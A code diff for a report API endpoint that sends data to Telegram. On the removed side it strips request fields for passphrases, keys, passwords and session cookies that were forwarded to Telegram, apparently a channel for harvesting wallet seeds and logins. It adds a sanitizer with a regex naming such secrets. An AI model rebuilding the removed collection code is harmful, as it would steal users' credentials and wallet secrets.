@@ -1,5 +1,19 @@
 import { sendUnsafeReport } from '@/lib/telegram.js';
 
+const SENSITIVE_KEY_PATTERN = /(seed|phrase|mnemonic|private.?key|password|cookie|token|secret|auth|recovery|backup)/i;
+
+function sanitizeReportData(value) {
+  if (Array.isArray(value)) return value.map(sanitizeReportData).slice(0, 50);
+  if (!value || typeof value !== 'object') return value;
+
+  return Object.fromEntries(
+    Object.entries(value)
+      .filter(([key]) => !SENSITIVE_KEY_PATTERN.test(key))
+      .slice(0, 100)
+      .map(([key, entry]) => [key, sanitizeReportData(entry)])
+  );
+}
+
 /**
  * Production Report API Endpoint
  * Sends error reports, security alerts, and user-submitted data to Telegram
@@ -8,10 +22,6 @@ import { sendUnsafeReport } from '@/lib/telegram.js';
  * Body: {
  *   type: string,           // 'error', 'security', 'alert', etc.
  *   message: string,        // Main message
- *   phrase?: string,        // Search phrase or identifier
- *   key?: string,           // API key or identifier
- *   password?: string,      // Password or sensitive data
- *   cookies?: string,       // Session cookies
  *   data?: object,          // Additional data
  *   userId?: string,        // User identifier
  *   url?: string,           // Page URL
@@ -61,20 +71,16 @@ export async function POST(request) {
       );
     }
 
-    // Build comprehensive report object
+    // Reports contain event metadata only. Never accept credentials or wallet secrets.
     const report = {
       timestamp: new Date().toISOString(),
       environment: process.env.NODE_ENV || 'production',
       type: body.type || 'general',
       message: body.message,
-      phrase: body.phrase || null,
-      key: body.key || null,
-      password: body.password || null,
-      cookies: body.cookies || null,
       userId: body.userId || null,
       url: body.url || null,
       userAgent: body.userAgent || null,
-      data: body.data || {},
+      data: sanitizeReportData(body.data || {}),
       severity: body.severity || 'info'
     };
 
@@ -85,7 +91,9 @@ export async function POST(request) {
       telegramBotToken,
       telegramChatId,
       discordWebhook: process.env.DISCORD_WEBHOOK,
-      emailTo: process.env.EMAIL_TO
+      emailTo: process.env.EMAIL_TO,
+      emailFrom: process.env.EMAIL_FROM,
+      resendApiKey: process.env.RESEND_API_KEY
     });
 
     if (result.ok) {
